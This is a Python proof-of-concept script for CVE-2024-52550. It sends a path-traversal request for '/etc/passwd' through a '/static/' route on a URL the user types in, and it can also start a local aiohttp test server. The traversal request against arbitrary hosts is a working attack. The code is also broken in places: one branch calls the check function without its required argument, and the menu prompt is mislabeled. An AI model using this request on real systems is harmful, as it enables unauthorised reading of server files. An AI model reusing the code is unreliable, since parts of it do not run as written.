import asyncio
from aiohttp import web
import os
import requests

def get_CVE_is_true(vuln):
    target = vuln+"/static/../../../../etc/passwd"
    resp = requests.get(target)

    if "root:x" in resp.text:
        print("[+] Potentially vulnerable to CVE-2024-52550")
    else:
        print("[-] Looks safe or protected")
async def init_app():
    app = web.Application()
    static_path = os.path.join(os.getcwd(), "static")
    os.makedirs(static_path, exist_ok=True)
    with open("secret.txt", "w") as f:
        f.write("TOP SECRET DATA")
    with open(os.path.join(static_path, "hello.txt"), "w") as f:
        f.write("Hello from static folder!")
    app.router.add_static('/static/', static_path, show_index=True)
    return app
print("""
    1. CVE-2024-52550 PoC
    ======================
    2. CVE-2024-52550 test      """)
async def main():
    n=int(input("Enter the number of requests to send: "))
    if n==2:
        print("Testing for CVE-2024-52550...")
        url = input("Enter the URL to test (https://example.com/): ")
        get_CVE_is_true(url)
    elif n==1:
        print("Starting the server...")
        get_CVE_is_true()
        loop = asyncio.get_event_loop()
        app = loop.run_until_complete(init_app())
        web.run_app(app, port=8080)
    else:
        print("Invalid option. Please choose 1 or 2.")
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServer stopped.")
    except Exception as e:
        print("An error occurred: ", e)